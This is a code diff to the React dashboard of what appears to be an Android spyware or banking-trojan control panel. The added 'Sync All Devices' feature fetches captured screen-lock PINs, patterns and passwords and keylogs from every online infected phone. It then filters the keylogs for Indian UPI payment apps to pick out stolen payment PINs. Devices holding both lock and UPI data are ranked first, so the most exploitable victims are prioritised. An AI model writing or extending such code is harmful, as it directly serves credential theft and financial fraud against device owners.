@@ -4,7 +4,7 @@ import { useEffect, useState, useCallback, Suspense } from 'react';
 import Sidebar from '@/components/layout/Sidebar';
 import Header from '@/components/layout/Header';
 import DeviceCard from '@/components/devices/DeviceCard';
-import { getDevices, refreshRealtimeStatus } from '@/lib/api';
+import { getDevices, refreshRealtimeStatus, getUnlocks, getKeylogs } from '@/lib/api';
 import { useDevicesStore, useAuthStore } from '@/lib/store';
 import { connectSocket } from '@/lib/socket';
 import { subscribeToDeviceStatuses } from '@/lib/firebase';
@@ -29,6 +29,11 @@ import {
   LayoutGrid,
   List,
   Sparkles,
+  RefreshCw,
+  X,
+  Lock,
+  Key,
+  Hash,
 } from 'lucide-react';
 import { useRouter } from 'next/navigation';
 
@@ -45,6 +50,16 @@ interface EnhancedDevice {
   isPinned?: boolean;
   remark?: string;
   owner?: { id: string; username: string };
+  // Sync data - updated when user clicks Sync All
+  syncData?: {
+    hasLockData: boolean;
+    hasUpiData: boolean;
+    unlockCount: number;
+    patternCount: number;
+    upiPinsCount: number;
+    capturedUpiApps: string[];  // List of UPI app names with captured data
+    lockDetails: { type: string; count: number }[];  // Lock data breakdown
+  };
 }
 
 export default function Dashboard() {
@@ -92,6 +107,22 @@ function DashboardContent() {
     online: true,
     offline: false,
   });
+
+  // Sync All Devices State
+  const [syncModalOpen, setSyncModalOpen] = useState(false);
+  const [syncing, setSyncing] = useState(false);
+  const [syncResults, setSyncResults] = useState<{
+    deviceId: string;
+    model: string;
+    manufacturer: string;
+    unlockCount: number;
+    patternCount: number;
+    upiPinsCount: number;
+    hasLockData: boolean;
+    hasUpiData: boolean;
+    capturedUpiApps: string[];
+    lockDetails: { type: string; count: number }[];
+  }[]>([]);
 
   // Pinned devices state
   const [pinnedDeviceIds, setPinnedDeviceIds] = useState<Set<string>>(new Set());
@@ -218,6 +249,126 @@ function DashboardContent() {
     setExpandedSections(prev => ({ ...prev, [section]: !prev[section] }));
   };
 
+  // UPI package names for detecting payment app pins
+  const UPI_PACKAGES = [
+    'net.one97.paytm', 'com.phonepe.app', 'com.google.android.apps.nbu.paisa.user',
+    'in.org.npci.upiapp', 'in.amazon.mShop.android.shopping', 'com.whatsapp',
+    'com.dreamplug.androidapp', 'com.freecharge.android', 'com.mobikwik_new',
+    'com.csam.icici.bank.imobile', 'com.sbi.upi', 'in.gov.umang.negd.g2c',
+  ];
+
+  // Handle Sync All Online Devices
+  const handleSyncAllDevices = useCallback(async () => {
+    setSyncing(true);
+    setSyncModalOpen(true);
+    setSyncResults([]);
+
+    const onlineDevicesList = enhancedDevices.filter(d => d.isOnline);
+    const results: typeof syncResults = [];
+
+    for (const device of onlineDevicesList) {
+      try {
+        // Fetch unlock attempts
+        const unlocksRes = await getUnlocks(device.id);
+        const unlocks = unlocksRes?.data || [];
+
+        // Fetch keylogs to check for UPI pins
+        const keylogsRes = await getKeylogs(device.id, 1, 500);
+        const keylogs = keylogsRes?.data || [];
+
+        // Count different types
+        const pinUnlocks = unlocks.filter((u: any) => u.unlockType === 'pin');
+        const patternUnlocks = unlocks.filter((u: any) => u.unlockType === 'pattern');
+
+        // Check for UPI app keylogs and collect unique app names
+        const upiAppSet = new Set<string>();
+        const upiKeylogs = keylogs.filter((k: any) => {
+          const matchedPkg = UPI_PACKAGES.find(pkg => k.app?.includes(pkg));
+          if (matchedPkg) {
+            // Get friendly name from known packages or use app name
+            const friendlyNames: { [key: string]: string } = {
+              'net.one97.paytm': 'Paytm',
+              'com.phonepe.app': 'PhonePe',
+              'com.google.android.apps.nbu.paisa.user': 'Google Pay',
+              'in.org.npci.upiapp': 'BHIM',
+              'in.amazon.mShop.android.shopping': 'Amazon Pay',
+              'com.whatsapp': 'WhatsApp',
+              'com.dreamplug.androidapp': 'CRED',
+              'com.freecharge.android': 'Freecharge',
+              'com.mobikwik_new': 'MobiKwik',
+              'com.csam.icici.bank.imobile': 'iMobile',
+              'com.sbi.upi': 'SBI UPI',
+            };
+            upiAppSet.add(friendlyNames[matchedPkg] || k.appName || matchedPkg);
+            return true;
+          }
+          if (k.appName?.toLowerCase().includes('pay') || k.appName?.toLowerCase().includes('upi')) {
+            upiAppSet.add(k.appName);
+            return true;
+          }
+          return false;
+        });
+
+        // Build lock details breakdown
+        const lockDetails: { type: string; count: number }[] = [];
+        if (pinUnlocks.length > 0) lockDetails.push({ type: 'PINs', count: pinUnlocks.length });
+        if (patternUnlocks.length > 0) lockDetails.push({ type: 'Patterns', count: patternUnlocks.length });
+        const passwordUnlocks = unlocks.filter((u: any) => u.unlockType === 'password');
+        if (passwordUnlocks.length > 0) lockDetails.push({ type: 'Passwords', count: passwordUnlocks.length });
+
+        results.push({
+          deviceId: device.deviceId,
+          model: device.model || 'Unknown',
+          manufacturer: device.manufacturer || 'Unknown',
+          unlockCount: pinUnlocks.length,
+          patternCount: patternUnlocks.length,
+          upiPinsCount: upiKeylogs.length,
+          hasLockData: unlocks.length > 0,
+          hasUpiData: upiKeylogs.length > 0,
+          capturedUpiApps: Array.from(upiAppSet),
+          lockDetails,
+        });
+      } catch (err) {
+        console.error(`Failed to sync device ${device.deviceId}:`, err);
+        results.push({
+          deviceId: device.deviceId,
+          model: device.model || 'Unknown',
+          manufacturer: device.manufacturer || 'Unknown',
+          unlockCount: 0,
+          patternCount: 0,
+          upiPinsCount: 0,
+          hasLockData: false,
+          hasUpiData: false,
+          capturedUpiApps: [],
+          lockDetails: [],
+        });
+      }
+    }
+
+    setSyncResults(results);
+    setSyncing(false);
+
+    // Persist sync data to enhancedDevices for showing badges on device cards
+    setEnhancedDevices(prev => prev.map(device => {
+      const syncResult = results.find(r => r.deviceId === device.deviceId);
+      if (syncResult) {
+        return {
+          ...device,
+          syncData: {
+            hasLockData: syncResult.hasLockData,
+            hasUpiData: syncResult.hasUpiData,
+            unlockCount: syncResult.unlockCount,
+            patternCount: syncResult.patternCount,
+            upiPinsCount: syncResult.upiPinsCount,
+            capturedUpiApps: syncResult.capturedUpiApps,
+            lockDetails: syncResult.lockDetails,
+          }
+        };
+      }
+      return device;
+    }));
+  }, [enhancedDevices]);
+
   if (!isHydrated || !isAuthenticated) return null;
 
   // Filter devices by search
@@ -228,10 +379,30 @@ function DashboardContent() {
     d.deviceId.toLowerCase().includes(searchQuery.toLowerCase())
   );
 
-  // Categorize devices
-  const pinnedDevices = filteredDevices.filter(d => pinnedDeviceIds.has(d.deviceId));
-  const onlineDevices = filteredDevices.filter(d => d.isOnline && !pinnedDeviceIds.has(d.deviceId));
-  const offlineDevices = filteredDevices.filter(d => !d.isOnline && !pinnedDeviceIds.has(d.deviceId));
+  // Categorize devices - all with stable sort by deviceId
+  const pinnedDevices = filteredDevices
+    .filter(d => pinnedDeviceIds.has(d.deviceId))
+    .sort((a, b) => a.deviceId.localeCompare(b.deviceId));
+  const onlineDevices = filteredDevices
+    .filter(d => d.isOnline && !pinnedDeviceIds.has(d.deviceId))
+    .sort((a, b) => {
+      // Sort by sync data: Both > UPI > Lock > Neither
+      // Use deviceId as secondary key for STABLE sorting (prevents shuffling)
+      const getPriority = (d: typeof a) => {
+        if (d.syncData?.hasUpiData && d.syncData?.hasLockData) return 1;
+        if (d.syncData?.hasUpiData) return 2;
+        if (d.syncData?.hasLockData) return 3;
+        return 4;
+      };
+      const priorityDiff = getPriority(a) - getPriority(b);
+      // If same priority, sort by deviceId for consistent ordering
+      if (priorityDiff !== 0) return priorityDiff;
+      return a.deviceId.localeCompare(b.deviceId);
+    });
+  // Sort offline devices by deviceId for stable ordering
+  const offlineDevices = filteredDevices
+    .filter(d => !d.isOnline && !pinnedDeviceIds.has(d.deviceId))
+    .sort((a, b) => a.deviceId.localeCompare(b.deviceId));
 
   const totalCount = enhancedDevices.length;
   const onlineCount = enhancedDevices.filter(d => d.isOnline).length;
@@ -425,6 +596,123 @@ function DashboardContent() {
                 />
               )}
 
+              {/* Sync All Devices Button */}
+              <div className="flex items-center justify-between px-2 py-4">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-fuchsia-500 to-purple-600 flex items-center justify-center shadow-lg">
+                    <RefreshCw className="w-5 h-5 text-white" />
+                  </div>
+                  <div>
+                    <h3 className="text-sm font-bold text-[var(--text-primary)]">Quick Sync</h3>
+                    <p className="text-[10px] text-[var(--text-muted)]">Check captured pins for all online devices</p>
+                  </div>
+                </div>
+                <button
+                  onClick={handleSyncAllDevices}
+                  disabled={syncing}
+                  className="flex items-center gap-2 px-4 py-2.5 rounded-xl bg-gradient-to-r from-fuchsia-500 to-purple-600 text-white font-medium text-sm shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50"
+                >
+                  <RefreshCw className={`w-4 h-4 ${syncing ? 'animate-spin' : ''}`} />
+                  {syncing ? 'Syncing...' : 'Sync All Devices'}
+                </button>
+              </div>
+
+              {/* Sync Results Modal */}
+              {syncModalOpen && (
+                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
+                  <div className="bg-white rounded-2xl shadow-2xl w-[90%] max-w-2xl max-h-[80vh] overflow-hidden">
+                    <div className="flex items-center justify-between p-4 border-b bg-gradient-to-r from-fuchsia-500 to-purple-600">
+                      <div className="flex items-center gap-3">
+                        <RefreshCw className={`w-5 h-5 text-white ${syncing ? 'animate-spin' : ''}`} />
+                        <h2 className="text-lg font-bold text-white">
+                          {syncing ? 'Syncing All Devices...' : 'Sync Results'}
+                        </h2>
+                      </div>
+                      <button
+                        onClick={() => setSyncModalOpen(false)}
+                        className="p-2 rounded-lg hover:bg-white/20 transition-colors"
+                      >
+                        <X className="w-5 h-5 text-white" />
+                      </button>
+                    </div>
+
+                    <div className="p-4 overflow-y-auto max-h-[60vh]">
+                      {syncing ? (
+                        <div className="flex flex-col items-center justify-center py-12">
+                          <div className="w-16 h-16 rounded-full border-4 border-purple-500 border-t-transparent animate-spin mb-4" />
+                          <p className="text-[var(--text-muted)]">Fetching data from all online devices...</p>
+                        </div>
+                      ) : syncResults.length === 0 ? (
+                        <div className="text-center py-12">
+                          <p className="text-[var(--text-muted)]">No online devices found</p>
+                        </div>
+                      ) : (
+                        <div className="space-y-3">
+                          {[...syncResults]
+                            .sort((a, b) => {
+                              // Priority: 1=Both, 2=UPI only, 3=Lock only, 4=Neither
+                              const getPriority = (r: typeof a) => {
+                                if (r.hasUpiData && r.hasLockData) return 1;
+                                if (r.hasUpiData) return 2;
+                                if (r.hasLockData) return 3;
+                                return 4;
+                              };
+                              return getPriority(a) - getPriority(b);
+                            })
+                            .map((result) => (
+                              <div
+                                key={result.deviceId}
+                                className="p-4 rounded-xl border border-slate-200 hover:border-purple-300 transition-colors"
+                              >
+                                <div className="flex items-center justify-between">
+                                  <div>
+                                    <h3 className="font-semibold text-[var(--text-primary)]">
+                                      {result.manufacturer} {result.model}
+                                    </h3>
+                                    <p className="text-xs text-[var(--text-muted)]">{result.deviceId.slice(0, 20)}...</p>
+                                  </div>
+                                  <div className="flex items-center gap-2">
+                                    {result.hasLockData && (
+                                      <span className="flex items-center gap-1 px-2 py-1 rounded-full bg-emerald-100 text-emerald-700 text-xs font-medium">
+                                        <Lock className="w-3 h-3" />
+                                        Screen Lock
+                                      </span>
+                                    )}
+                                    {result.hasUpiData && (
+                                      <span className="flex items-center gap-1 px-2 py-1 rounded-full bg-orange-100 text-orange-700 text-xs font-medium">
+                                        <Key className="w-3 h-3" />
+                                        UPI Pins
+                                      </span>
+                                    )}
+                                  </div>
+                                </div>
+
+                                <div className="mt-3 flex items-center gap-4 text-sm">
+                                  <div className="flex items-center gap-1.5">
+                                    <Hash className="w-4 h-4 text-blue-500" />
+                                    <span className="text-[var(--text-muted)]">PINs:</span>
+                                    <span className="font-semibold text-[var(--text-primary)]">{result.unlockCount}</span>
+                                  </div>
+                                  <div className="flex items-center gap-1.5">
+                                    <Lock className="w-4 h-4 text-purple-500" />
+                                    <span className="text-[var(--text-muted)]">Patterns:</span>
+                                    <span className="font-semibold text-[var(--text-primary)]">{result.patternCount}</span>
+                                  </div>
+                                  <div className="flex items-center gap-1.5">
+                                    <Key className="w-4 h-4 text-orange-500" />
+                                    <span className="text-[var(--text-muted)]">UPI:</span>
+                                    <span className="font-semibold text-[var(--text-primary)]">{result.upiPinsCount}</span>
+                                  </div>
+                                </div>
+                              </div>
+                            ))}
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                </div>
+              )}
+
               {/* Online Devices */}
               <DeviceSection
                 title="Online Devices"
@@ -519,8 +807,8 @@ function DeviceSection({
         <button
           onClick={onToggle}
           className={`group flex items-center gap-2 px-4 py-2 rounded-xl transition-all duration-300 border ${expanded
-              ? 'bg-slate-900 border-slate-900 text-white shadow-lg shadow-slate-900/10'
-              : 'bg-white border-slate-200 text-slate-500 hover:border-slate-300 hover:text-slate-900'
+            ? 'bg-slate-900 border-slate-900 text-white shadow-lg shadow-slate-900/10'
+            : 'bg-white border-slate-200 text-slate-500 hover:border-slate-300 hover:text-slate-900'
             }`}
         >
           <span className="text-xs font-bold uppercase tracking-widest hidden sm:inline">
